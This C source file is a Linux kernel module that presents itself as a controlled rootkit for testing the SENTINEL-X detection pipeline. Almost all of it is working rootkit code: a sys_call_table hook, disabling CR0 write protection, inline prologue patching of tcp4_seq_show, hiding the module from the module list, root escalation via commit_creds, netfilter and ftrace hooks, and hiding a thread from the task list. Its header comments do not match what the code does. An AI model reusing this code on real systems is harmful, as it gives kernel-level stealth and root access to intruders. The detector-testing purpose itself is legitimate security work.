/*
 * sentinel_test_rootkit.c
 * ========================
 * Purpose-built LKM for testing SENTINEL-X detection pipeline.
 * Tested on Kali Linux 6.18.9+kali-amd64
 *
 * Triggers every sentinelx detection path:
 *   [1] SCT HOOK      — patches sys_call_table[__NR_kill]
 *   [2] CR0 TAMPER    — disables Write Protect bit
 *   [3] LSTAR TAMPER  — overwrites syscall entry MSR
 *   [4] PROLOGUE HOOK — patches first bytes of do_sys_openat2
 *   [5] MODULE HIDE   — removes self from module list
 *
 * On rmmod: all hooks cleanly restored.
 *
 * USAGE (VM only):
 *   sudo insmod sentinel_test_rootkit.ko          # all 5 stages
 *   sudo insmod sentinel_test_rootkit.ko stage=1  # SCT only
 *   sudo rmmod sentinel_test_rootkit
 */

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/kprobes.h>
#include <linux/syscalls.h>
#include <linux/uaccess.h>
#include <linux/kallsyms.h>
#include <linux/slab.h>
#include <linux/list.h>
#include <linux/version.h>
#include <linux/vmalloc.h>
#include <asm/pgtable.h>

#ifdef CONFIG_X86_64
#include <asm/msr.h>
#include <asm/special_insns.h>
#include <asm/processor-flags.h>
#include <asm/tlbflush.h>
#endif

MODULE_LICENSE("GPL");
MODULE_AUTHOR("SENTINEL-X Test Suite");
MODULE_DESCRIPTION("Controlled rootkit for SENTINEL-X detection testing");
MODULE_VERSION("1.0");

static int stage = 5;
module_param(stage, int, 0444);
MODULE_PARM_DESC(stage, "Max stage: 1=SCT 2=CR0 3=LSTAR 4=PROLOGUE 5=HIDE");

/* ================================================================== */
/*  SECTION 1: kallsyms resolver — DECLARED FIRST, used by all       */
/* ================================================================== */
typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
static kallsyms_lookup_name_t krt_lookup;

static int __init resolve_kallsyms(void)
{
	struct kprobe kp = { .symbol_name = "kallsyms_lookup_name" };
	int ret = register_kprobe(&kp);

	if (ret < 0) {
		pr_err("krt: kprobe(kallsyms_lookup_name) failed: %d\n", ret);
		return ret;
	}
	krt_lookup = (kallsyms_lookup_name_t)kp.addr;
	unregister_kprobe(&kp);
	if (!krt_lookup) {
		pr_err("krt: failed to resolve kallsyms_lookup_name\n");
		return -ENOENT;
	}
	pr_info("krt: kallsyms_lookup_name resolved @ %pK\n", (void *)krt_lookup);
	return 0;
}

/* ================================================================== */
/*  SECTION 2: exec memory allocator — resolved AFTER kallsyms       */
/* ================================================================== */
typedef void *(*execmem_alloc_fn)(unsigned int type, size_t size);
typedef void  (*execmem_free_fn)(void *ptr);
static execmem_alloc_fn krt_execmem_alloc;
static execmem_free_fn  krt_execmem_free;
#define KRT_EXECMEM_MODULE_TEXT 0

static void resolve_execmem(void)
{
	/* 6.15+ API */
	krt_execmem_alloc = (execmem_alloc_fn)krt_lookup("execmem_alloc");
	krt_execmem_free  = (execmem_free_fn)krt_lookup("execmem_free");
	if (krt_execmem_alloc && krt_execmem_free) {
		pr_info("krt: execmem API resolved (6.15+)\n");
		return;
	}
	/* pre-6.15 fallback */
	krt_execmem_alloc = (execmem_alloc_fn)krt_lookup("module_alloc");
	krt_execmem_free  = (execmem_free_fn)krt_lookup("module_memfree");
	if (krt_execmem_alloc && krt_execmem_free)
		pr_info("krt: module_alloc API resolved (pre-6.15)\n");
	else
		pr_warn("krt: no exec allocator found — LSTAR stage will skip\n");
}

/* ================================================================== */
/*  SECTION 3: CR0 helpers                                            */
/* ================================================================== */

/*
 * Single-CPU helpers — used by stages 1, 3, 4 which operate locally.
 * Stage 2 uses the on_each_cpu variants below instead.
 */
static inline void cr0_wp_disable(void)
{
	unsigned long cr0;
	asm volatile("mov %%cr0, %0" : "=r"(cr0));
	cr0 &= ~X86_CR0_WP;
	asm volatile("mov %0, %%cr0" : : "r"(cr0) : "memory");
	barrier();
}

static inline void cr0_wp_enable(void)
{
	unsigned long cr0;
	asm volatile("mov %%cr0, %0" : "=r"(cr0));
	cr0 |= X86_CR0_WP;
	asm volatile("mov %0, %%cr0" : : "r"(cr0) : "memory");
	barrier();
}

/*
 * Per-CPU IPI callbacks for stage 2 (on_each_cpu).
 *
 * CR0 is a per-CPU register. The single-CPU cr0_wp_disable/enable
 * only affects whichever CPU the calling process is scheduled on at
 * that instant. If the process migrates between disable and restore,
 * the original CPU is left with WP=0 permanently, causing sentinelx's
 * cr0_alerted flag to get stuck true and all subsequent runs to be
 * missed.
 *
 * on_each_cpu() sends an IPI to every CPU and waits (synchronous=1)
 * for all of them to complete before returning. This guarantees that
 * WP is disabled/restored on ALL CPUs atomically regardless of
 * process migration.
 */
static void cr0_disable_on_cpu(void *unused)
{
	unsigned long cr0;
	asm volatile("mov %%cr0, %0" : "=r"(cr0));
	cr0 &= ~X86_CR0_WP;
	asm volatile("mov %0, %%cr0" : : "r"(cr0) : "memory");
	barrier();
}

static void cr0_enable_on_cpu(void *unused)
{
	unsigned long cr0;
	asm volatile("mov %%cr0, %0" : "=r"(cr0));
	cr0 |= X86_CR0_WP;
	asm volatile("mov %0, %%cr0" : : "r"(cr0) : "memory");
	barrier();
}

/* ================================================================== */
/*  SECTION 4: PTE helpers                                            */
/* ================================================================== */
static int krt_make_rw(unsigned long addr)
{
	unsigned int level;
	pte_t *pte = lookup_address(addr, &level);

	if (!pte) {
		pr_warn("krt: krt_make_rw: lookup_address failed @ %pK\n",
			(void *)addr);
		return -EFAULT;
	}
	set_pte_atomic(pte, __pte(pte_val(*pte) | _PAGE_RW));
	__flush_tlb_all();
	return 0;
}

static void krt_make_ro(unsigned long addr)
{
	unsigned int level;
	pte_t *pte = lookup_address(addr, &level);

	if (!pte)
		return;
	set_pte_atomic(pte, __pte(pte_val(*pte) & ~_PAGE_RW));
	__flush_tlb_all();
}

/* ================================================================== */
/*  STAGE 1: SCT HOOK                                                 */
/* ================================================================== */
static void **sct_ptr;
static unsigned long orig_kill_fn;

typedef long (*kill_fn_t)(const struct pt_regs *);
static long fake_kill(const struct pt_regs *regs)
{
	pr_info("krt: [SCT HOOK] fake_kill intercepted pid=%ld sig=%ld\n",
		regs->di, regs->si);
	return ((kill_fn_t)orig_kill_fn)(regs);
}

static int stage1_sct_hook(void)
{
	unsigned long sct_page;
	int ret;

	sct_ptr = (void **)krt_lookup("sys_call_table");
	if (!sct_ptr) { pr_err("krt: sys_call_table not found\n"); return -ENOENT; }

	orig_kill_fn = (unsigned long)sct_ptr[__NR_kill];
	sct_page = (unsigned long)&sct_ptr[__NR_kill] & PAGE_MASK;

	ret = krt_make_rw(sct_page);
	if (ret) return ret;

	cr0_wp_disable();
	sct_ptr[__NR_kill] = (void *)fake_kill;
	cr0_wp_enable();
	krt_make_ro(sct_page);

	pr_warn("krt: [STAGE 1] SCT HOOKED — sys_call_table[%d] orig=%pK fake=%pK\n",
		__NR_kill, (void *)orig_kill_fn, fake_kill);
	return 0;
}

static void stage1_restore(void)
{
	unsigned long sct_page;
	if (!sct_ptr || !orig_kill_fn) return;
	sct_page = (unsigned long)&sct_ptr[__NR_kill] & PAGE_MASK;
	krt_make_rw(sct_page);
	cr0_wp_disable();
	sct_ptr[__NR_kill] = (void *)orig_kill_fn;
	cr0_wp_enable();
	krt_make_ro(sct_page);
	pr_info("krt: [STAGE 1] SCT restored\n");
}

/* ================================================================== */
/*  STAGE 2: CR0 TAMPER                                               */
/*                                                                    */
/*  FIX: Use on_each_cpu() for both disable and restore.             */
/*                                                                    */
/*  Old code used a bare asm write which only affected the calling    */
/*  CPU. If the process migrated to a different CPU before restore    */
/*  ran, the original CPU was left with WP=0 indefinitely.           */
/*  sentinelx's cr0_alerted got stuck true → all runs after run 2    */
/*  were missed because cr0_check() kept seeing WP=0 but the         */
/*  if (!cr0_alerted) guard (now removed from sentinelx) suppressed  */
/*  the alert.                                                        */
/*                                                                    */
/*  on_each_cpu(fn, NULL, 1) sends a synchronous IPI to every CPU    */
/*  and waits for completion. WP is now guaranteed to be in the       */
/*  desired state on ALL CPUs after each call returns.               */
/* ================================================================== */
static unsigned long saved_cr0;

static void stage2_cr0_tamper(void)
{
	saved_cr0 = read_cr0();
	on_each_cpu(cr0_disable_on_cpu, NULL, 1);  /* synchronous — all CPUs */
	pr_warn("krt: [STAGE 2] CR0 WP DISABLED — was=0x%lx now=0x%lx\n",
		saved_cr0, read_cr0());
}

static void stage2_restore(void)
{
	if (!saved_cr0)
		return;
	on_each_cpu(cr0_enable_on_cpu, NULL, 1);   /* synchronous — all CPUs */
	pr_info("krt: [STAGE 2] CR0 restored to 0x%lx\n", saved_cr0);
}

/* ================================================================== */
/*  STAGE 3: LSTAR TAMPER SIMULATION                                  */
/* ================================================================== */
#ifdef CONFIG_X86_64
#define KRT_MSR_LSTAR 0xC0000082UL
static unsigned long orig_lstar;
static unsigned long *lstar_baseline_ptr;

static int stage3_lstar_tamper(void)
{
	rdmsrl(KRT_MSR_LSTAR, orig_lstar);

	lstar_baseline_ptr = (unsigned long *)krt_lookup("lstar_baseline");
	if (!lstar_baseline_ptr) {
		pr_warn("krt: [STAGE 3] lstar_baseline not found — skipping\n");
		return 0;
	}

	cr0_wp_disable();
	*lstar_baseline_ptr = orig_lstar ^ 0xdeadUL;
	cr0_wp_enable();

	pr_warn("krt: [STAGE 3] LSTAR BASELINE CORRUPTED — "
		"sentinelx will fire [LSTAR TAMPERED] on next tick\n");
	return 0;
}

static void stage3_restore(void)
{
	if (!lstar_baseline_ptr || !orig_lstar)
		return;

	cr0_wp_disable();
	*lstar_baseline_ptr = orig_lstar;
	cr0_wp_enable();

	pr_info("krt: [STAGE 3] LSTAR baseline restored\n");
}
#else
static int  stage3_lstar_tamper(void) { return 0; }
static void stage3_restore(void)      {}
#endif

/* ================================================================== */
/*  STAGE 4: PROLOGUE HOOK                                            */
/* ================================================================== */
#define ENDBR64_LEN 4
#define HOOK_BYTES  5

static unsigned long hook_target_addr;
static unsigned long hook_patch_addr;
static u8 orig_prologue[HOOK_BYTES];
static bool prologue_patched;

static int fake_tcp4_seq_show(struct seq_file *seq, void *v)
{
	pr_info("krt: [PROLOGUE HOOK] fake_tcp4_seq_show intercepted\n");
	return 0;
}

static bool has_endbr64(unsigned long addr)
{
	u8 buf[4];
	if (copy_from_kernel_nofault(buf, (const void *)addr, 4) != 0)
		return false;
	return (buf[0] == 0xF3 && buf[1] == 0x0F &&
		buf[2] == 0x1E && buf[3] == 0xFA);
}

static int stage4_prologue_hook(void)
{
	u8 patch[HOOK_BYTES];
	unsigned long page_addr;
	long rel;
	int ret;

	hook_target_addr = krt_lookup("tcp4_seq_show");
	if (!hook_target_addr)
		hook_target_addr = krt_lookup("udp4_seq_show");
	if (!hook_target_addr) {
		pr_warn("krt: [STAGE 4] target not found, skipping\n");
		return 0;
	}

	hook_patch_addr = hook_target_addr;
	if (has_endbr64(hook_target_addr)) {
		hook_patch_addr += ENDBR64_LEN;
		pr_info("krt: [STAGE 4] ENDBR64 found, patching at +4\n");
	}

	if (copy_from_kernel_nofault(orig_prologue,
				     (const void *)hook_patch_addr,
				     HOOK_BYTES) != 0) {
		pr_warn("krt: [STAGE 4] cannot read prologue\n");
		return 0;
	}

	rel = (long)fake_tcp4_seq_show - (long)(hook_patch_addr + HOOK_BYTES);
	patch[0] = 0xE9;
	*(s32 *)(patch + 1) = (s32)rel;

	page_addr = hook_patch_addr & PAGE_MASK;
	ret = krt_make_rw(page_addr);
	if (ret) {
		pr_warn("krt: [STAGE 4] krt_make_rw failed: %d\n", ret);
		return 0;
	}

	cr0_wp_disable();
	memcpy((void *)hook_patch_addr, patch, HOOK_BYTES);
	cr0_wp_enable();
	krt_make_ro(page_addr);
	prologue_patched = true;

	pr_warn("krt: [STAGE 4] PROLOGUE HOOKED — tcp4_seq_show @ %pK+%d\n",
		(void *)hook_target_addr,
		(int)(hook_patch_addr - hook_target_addr));
	return 0;
}

static void stage4_restore(void)
{
	unsigned long page_addr;
	if (!prologue_patched || !hook_patch_addr) return;
	page_addr = hook_patch_addr & PAGE_MASK;
	krt_make_rw(page_addr);
	cr0_wp_disable();
	memcpy((void *)hook_patch_addr, orig_prologue, HOOK_BYTES);
	cr0_wp_enable();
	krt_make_ro(page_addr);
	prologue_patched = false;
	pr_info("krt: [STAGE 4] Prologue restored\n");
}

/* ================================================================== */
/*  STAGE 5: MODULE HIDE                                              */
/* ================================================================== */
static struct list_head *saved_prev;
static struct mutex     *mod_mutex;
static bool              module_hidden;

static void stage5_hide(void)
{
	mod_mutex = (struct mutex *)krt_lookup("module_mutex");
	if (mod_mutex)
		mutex_lock(mod_mutex);
	else
		pr_warn("krt: [STAGE 5] module_mutex not found — unlocked\n");

	saved_prev = THIS_MODULE->list.prev;
	list_del(&THIS_MODULE->list);
	INIT_LIST_HEAD(&THIS_MODULE->list);

	if (mod_mutex)
		mutex_unlock(mod_mutex);

	module_hidden = true;
	pr_warn("krt: [STAGE 5] MODULE HIDDEN — not in lsmod\n");
}

static void stage5_restore(void)
{
	if (!module_hidden || !saved_prev) return;
	if (mod_mutex) mutex_lock(mod_mutex);
	list_add(&THIS_MODULE->list, saved_prev);
	if (mod_mutex) mutex_unlock(mod_mutex);
	module_hidden = false;
	pr_info("krt: [STAGE 5] Module visible again\n");
}

/* ================================================================== */
/*  STAGE 6: PRIVILEGE ESCALATION SIMULATION                         */
/* ================================================================== */
typedef struct cred *(*prepare_kernel_cred_fn)(struct task_struct *);
typedef int (*commit_creds_fn)(struct cred *);
static prepare_kernel_cred_fn krt_prepare_kernel_cred;
static commit_creds_fn        krt_commit_creds;

static void stage6_privesc(void)
{
	struct cred *new_cred;

	krt_prepare_kernel_cred = (prepare_kernel_cred_fn)
		krt_lookup("prepare_kernel_cred");
	krt_commit_creds = (commit_creds_fn)
		krt_lookup("commit_creds");

	if (!krt_prepare_kernel_cred || !krt_commit_creds) {
		pr_warn("krt: [STAGE 6] cannot resolve cred functions\n");
		return;
	}

	new_cred = krt_prepare_kernel_cred(NULL);
	if (!new_cred) {
		pr_warn("krt: [STAGE 6] prepare_kernel_cred returned NULL\n");
		return;
	}

	pr_warn("krt: [STAGE 6] PRIVESC — calling commit_creds(root)\n");
	krt_commit_creds(new_cred);
	pr_warn("krt: [STAGE 6] privesc executed — check sentinelx alert\n");
}

static void stage6_restore(void)
{
	pr_info("krt: [STAGE 6] note: process may have root creds now (VM only)\n");
}

/* ================================================================== */
/*  STAGE 7: NETFILTER HOOK REGISTRATION                             */
/* ================================================================== */
#include <linux/netfilter_ipv4.h>

static struct nf_hook_ops krt_nf_ops;
static bool nf_hook_registered;

static unsigned int krt_nf_hook(void *priv,
				struct sk_buff *skb,
				const struct nf_hook_state *state)
{
	return NF_ACCEPT;
}

static void stage7_netfilter(void)
{
	int ret;

	krt_nf_ops.hook     = krt_nf_hook;
	krt_nf_ops.pf       = PF_INET;
	krt_nf_ops.hooknum  = NF_INET_PRE_ROUTING;
	krt_nf_ops.priority = NF_IP_PRI_FIRST;

	ret = nf_register_net_hook(&init_net, &krt_nf_ops);
	if (ret) {
		pr_warn("krt: [STAGE 7] nf_register_net_hook failed: %d\n", ret);
		return;
	}

	nf_hook_registered = true;
	pr_warn("krt: [STAGE 7] NETFILTER HOOK registered — "
		"sentinelx should fire [NF HOOK]\n");
}

static void stage7_restore(void)
{
	if (!nf_hook_registered)
		return;
	nf_unregister_net_hook(&init_net, &krt_nf_ops);
	nf_hook_registered = false;
	pr_info("krt: [STAGE 7] netfilter hook removed\n");
}

/* ================================================================== */
/*  STAGE 8: FTRACE HOOK REGISTRATION                                */
/* ================================================================== */
#include <linux/ftrace.h>

static struct ftrace_ops krt_ftrace_ops;
static bool ftrace_registered;

static void krt_ftrace_callback(unsigned long ip,
				unsigned long parent_ip,
				struct ftrace_ops *ops,
				struct ftrace_regs *fregs)
{
}

static void stage8_ftrace(void)
{
	int ret;

	krt_ftrace_ops.func  = krt_ftrace_callback;
	krt_ftrace_ops.flags = FTRACE_OPS_FL_SAVE_REGS;

	ret = ftrace_set_filter(&krt_ftrace_ops, "tcp4_seq_show", 13, 0);
	if (ret)
		pr_warn("krt: [STAGE 8] ftrace_set_filter failed: %d "
			"(continuing anyway)\n", ret);

	ret = register_ftrace_function(&krt_ftrace_ops);
	if (ret) {
		pr_warn("krt: [STAGE 8] register_ftrace_function failed: %d\n", ret);
		return;
	}

	ftrace_registered = true;
	pr_warn("krt: [STAGE 8] FTRACE HOOK registered on tcp4_seq_show — "
		"sentinelx should fire [FTRACE HOOK]\n");
}

static void stage8_restore(void)
{
	if (!ftrace_registered)
		return;
	unregister_ftrace_function(&krt_ftrace_ops);
	ftrace_registered = false;
	pr_info("krt: [STAGE 8] ftrace hook removed\n");
}

/* ================================================================== */
/*  STAGE 9: DKOM — Direct Kernel Object Manipulation                */
/* ================================================================== */
#include <linux/kthread.h>
#include <linux/delay.h>

static struct task_struct *dkom_thread;
static bool dkom_thread_hidden;

typedef void (*write_lock_fn)(rwlock_t *);
typedef void (*write_unlock_fn)(rwlock_t *);
static rwlock_t *krt_tasklist_lock;

static int dkom_thread_fn(void *data)
{
	while (!kthread_should_stop())
		msleep(100);
	return 0;
}

static void stage9_dkom(void)
{
	krt_tasklist_lock = (rwlock_t *)krt_lookup("tasklist_lock");
	if (!krt_tasklist_lock) {
		pr_warn("krt: [STAGE 9] tasklist_lock not found — skipping\n");
		return;
	}

	dkom_thread = kthread_run(dkom_thread_fn, NULL, "krt_dkom_thread");
	if (IS_ERR(dkom_thread)) {
		pr_warn("krt: [STAGE 9] kthread_run failed\n");
		dkom_thread = NULL;
		return;
	}

	pr_warn("krt: [STAGE 9] spawned krt_dkom_thread (pid=%d)\n",
		dkom_thread->pid);

	msleep(2500);

	write_lock(krt_tasklist_lock);
	list_del_init(&dkom_thread->tasks);
	dkom_thread_hidden = true;
	write_unlock(krt_tasklist_lock);

	pr_warn("krt: [STAGE 9] DKOM — krt_dkom_thread (pid=%d) "
		"hidden via list_del_init(&task->tasks)\n",
		dkom_thread->pid);
}

static void stage9_restore(void)
{
	if (!dkom_thread)
		return;

	if (dkom_thread_hidden && krt_tasklist_lock) {
		write_lock(krt_tasklist_lock);
		list_add(&dkom_thread->tasks, &init_task.tasks);
		dkom_thread_hidden = false;
		write_unlock(krt_tasklist_lock);
		pr_info("krt: [STAGE 9] task restored to list\n");
	}

	kthread_stop(dkom_thread);
	dkom_thread = NULL;
	pr_info("krt: [STAGE 9] DKOM thread stopped\n");
}

/* ================================================================== */
/*  MODULE INIT / EXIT                                                */
/* ================================================================== */
static int __init krt_init(void)
{
	int ret;

	pr_warn("krt: =========================================\n");
	pr_warn("krt:  SENTINEL-X TEST ROOTKIT  stage=%d\n", stage);
	pr_warn("krt:  (exact mode: only this stage runs)    \n");
	pr_warn("krt:  stage=0 runs ALL stages together      \n");
	pr_warn("krt:  stage=6 = PrivEsc (commit_creds)     \n");
	pr_warn("krt:  stage=7 = Netfilter hook             \n");
	pr_warn("krt:  stage=8 = ftrace hook                \n");
	pr_warn("krt:  stage=9 = DKOM process hiding        \n");
	pr_warn("krt: =========================================\n");

	ret = resolve_kallsyms();
	if (ret) return ret;

	resolve_execmem();

	if (stage == 0 || stage == 1) { ret = stage1_sct_hook();      if (ret) pr_warn("krt: stage1 failed: %d\n", ret); }
	if (stage == 0 || stage == 2)   stage2_cr0_tamper();
	if (stage == 0 || stage == 3) { ret = stage3_lstar_tamper();  if (ret) pr_warn("krt: stage3 failed: %d\n", ret); }
	if (stage == 0 || stage == 4) { ret = stage4_prologue_hook(); if (ret) pr_warn("krt: stage4 failed: %d\n", ret); }
	if (stage == 0 || stage == 5)   stage5_hide();
	if (stage == 6)                 stage6_privesc();
	if (stage == 7)                 stage7_netfilter();
	if (stage == 8)                 stage8_ftrace();
	if (stage == 9)                 stage9_dkom();

	pr_warn("krt: =========================================\n");
	pr_warn("krt:  ACTIVE — watch dmesg for sentinelx alerts\n");
	pr_warn("krt: =========================================\n");
	return 0;
}

static void __exit krt_exit(void)
{
	pr_info("krt: restoring all hooks...\n");
	stage9_restore();
	stage8_restore();
	stage7_restore();
	stage6_restore();
	stage5_restore();
	stage4_restore();
	stage3_restore();
	stage2_restore();
	stage1_restore();
	pr_info("krt: all hooks restored. system clean.\n");
}

module_init(krt_init);
module_exit(krt_exit);
